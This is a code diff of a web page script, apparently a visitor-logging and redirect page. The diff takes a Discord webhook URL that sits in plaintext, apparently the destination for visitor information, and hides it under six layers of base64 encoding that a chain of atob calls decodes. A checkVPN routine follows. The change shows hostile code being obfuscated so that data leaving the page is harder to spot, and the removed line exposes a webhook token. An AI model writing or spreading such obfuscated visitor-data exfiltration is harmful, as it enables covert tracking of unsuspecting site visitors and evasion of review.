@@ -6,9 +6,15 @@
   <script>
     async function sendVisitorInfoAndRedirect() {
 
-        const webhookUrl = 'https://discord.com/api/webhooks/1318804398440452136/fa3kekz8agZxMqxNWDUvxBcwtjsinZvHKnXkXFWNWS5MveDK0U1H4FqTByULxQ_kafHF';
+        const encodedWebhookLayer5 = 'VmpGYVYySXhWWGROVldoVllUSjRWbFpyV25kVWJIQlhWVzVPYW1KSGVGaFpWVlUxWVVkS1ZtSkVXbFpOYWtWM1ZrWmtTMVpyTlZWVGJIQnBVbFJCZUZkV1ZtdFVNVTVJVWxod1dHSllVazlaYTFwM1pERmtWMVp0Y0U5V01Vb3dWV3hvZDFaV1pFZGpSVGxYWVRGV05GUnJXbEprTVZaMFRsZDBUbEpHV2tkV2ExcFRWakZXUjFOclpGTlhSMUpXVm14YVMxVXhVbGRXV0docVZtdHdXbGt3VlRWaFJscElaVVJDVjAxV2NGUldSRXBQWXpKT1IyRkhkRk5TYmtKU1ZsZHdRMWxYVWxkWFdHeFBWbnBzVmxsc1ZURlhiR3hXVmxSV1YwMUVSa2hWTW5ocldWWktObFp1V2xaV1JWcDVXbGQ0ZDFKV1JuUmhSMnhvWld4WmVsWXhZM2hPUjFGM1RWaE9WV0V4Y0hKVk1GcGhWMVpXY1ZSc1RsaGlSbG93V2xWa01GWlZNVmRpUkZKWFVteEtTRlpzV210U01rNUpWR3hhYUUxV2J6SlhhMUpIV1ZaYVYxTnVTbWxTVkd4VVZtMDFRazFHV25Sa1JtUlVUVVJXV0ZZeWVHRmlSa3BIVTJ4a1YySllRbnBhVmxwclZqRndTRkpzVWxkaE0wSXg';
+        
 
-
+        let decodedLayer4 = atob(encodedWebhookLayer5);
+        let decodedLayer3 = atob(decodedLayer4)
+        let decodedLayer2 = atob (decodedLayer3)
+        let decodedLayer1 = atob(decodedLayer2);
+        let decodedLayer0 = atob(decodedLayer1);
+        const webhookUrl = atob(decodedLayer0);  
         async function checkVPN() {
             try {
 
